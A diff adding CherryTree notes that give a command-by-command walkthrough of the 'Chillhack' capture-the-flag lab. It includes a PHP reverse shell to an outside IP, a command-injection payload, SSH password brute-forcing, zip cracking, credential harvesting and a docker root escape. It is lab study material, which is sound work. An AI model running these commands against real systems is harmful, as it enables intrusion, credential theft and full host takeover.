@@ -1,0 +1,114 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Chillhack" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692600966" ts_lastsave="1692946796">
+    <rich_text weight="heavy">enumeration</rich_text>
+    <rich_text>
+			</rich_text>
+    <rich_text underline="single">nmap scan</rich_text>
+    <rich_text>
+					nmap -sC -sV -vv -Pn -n 10.10.0.236
+					
+			</rich_text>
+    <rich_text underline="single">directory enumeration</rich_text>
+    <rich_text>
+					gobuster dir -u </rich_text>
+    <rich_text link="webs http://10.10.0.236">http://10.10.0.236</rich_text>
+    <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -z
+					
+			</rich_text>
+    <rich_text underline="single">ftp anon</rich_text>
+    <rich_text>
+					ftp 10.10.0.236 21					
+			
+</rich_text>
+    <rich_text weight="heavy">Exploitation</rich_text>
+    <rich_text>
+		</rich_text>
+    <rich_text underline="single">reverse shell</rich_text>
+    <rich_text>
+					php -r '$sock=fsockopen("10.18.85.195",4444);exec("sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+					cmd execution		- 		whoami;php -r '$sock=fsockopen("10.18.85.195",4444);exec("sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+					nc -nlvp 4444
+					
+
+</rich_text>
+    <rich_text weight="heavy">Post Exploitation</rich_text>
+    <rich_text>
+		</rich_text>
+    <rich_text underline="single">shell stablization</rich_text>
+    <rich_text>
+					python3 -c 'import pty;pty.spawn("/bin/bash")'
+					
+		</rich_text>
+    <rich_text underline="single">privilege escalation</rich_text>
+    <rich_text>
+			</rich_text>
+    <rich_text underline="single">sudo permissions</rich_text>
+    <rich_text>
+					sudo -l
+					sudo -ll
+			
+			</rich_text>
+    <rich_text underline="single">horizontal escalation</rich_text>
+    <rich_text>
+				</rich_text>
+    <rich_text underline="single">password bruteforce</rich_text>
+    <rich_text>
+					hydra -l apaar -P /usr/share/wordlists/rockyou.txt 10.10.0.236 ssh		- 		does not work
+					sudo -u apaar ./.helpline.sh
+					 
+							</rich_text>
+    <rich_text underline="single">shell stablization</rich_text>
+    <rich_text>
+										python3 -c 'import pty;pty.spawn("/bin/bash")'
+										
+							</rich_text>
+    <rich_text underline="single">Linpeas.sh</rich_text>
+    <rich_text>
+										executing linpeas.sh on new user to gain additional resources to gain higher privileges
+							
+							</rich_text>
+    <rich_text underline="single">port binding</rich_text>
+    <rich_text>
+										ssh 9001:localhost:9001 anurodh@10.10.0.236 -i id_rsa
+										
+									</rich_text>
+    <rich_text underline="single">Binded port directory enumeration</rich_text>
+    <rich_text>
+											gobuster dir -u </rich_text>
+    <rich_text link="webs http://127.0.0.1:9001/">http://127.0.0.1:9001/</rich_text>
+    <rich_text> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium -t 50 -z -x php
+											
+											</rich_text>
+    <rich_text underline="single">analysing pictures</rich_text>
+    <rich_text>
+													steghide --extract -sf hacker.jpg
+													fcrackzip -u -v -D -p ~/Wordlists/rockyou.txt backup.zip
+													unzip backup.zip
+													echo IWQwbnRLbjB3bVlwQHNzdzByZA== | base64 -d
+											
+									</rich_text>
+    <rich_text underline="single">database login</rich_text>
+    <rich_text>
+											/var/www/files/index.php		-		mysql credentials
+											mysql -u root -p						-		show databases; show tables; selct * from users;
+											
+				</rich_text>
+    <rich_text underline="single">ssh login</rich_text>
+    <rich_text>
+					ssh anurodh@10.10.0.236
+					
+			</rich_text>
+    <rich_text underline="single">docker container</rich_text>
+    <rich_text>
+					gtfobins
+					docker run -v /:/mnt --rm -it alpine chroot /mnt sh		-		to gain a root shell
+											
+									
+									
+							
+										
+										
+										</rich_text>
+  </node>
+</cherrytree>
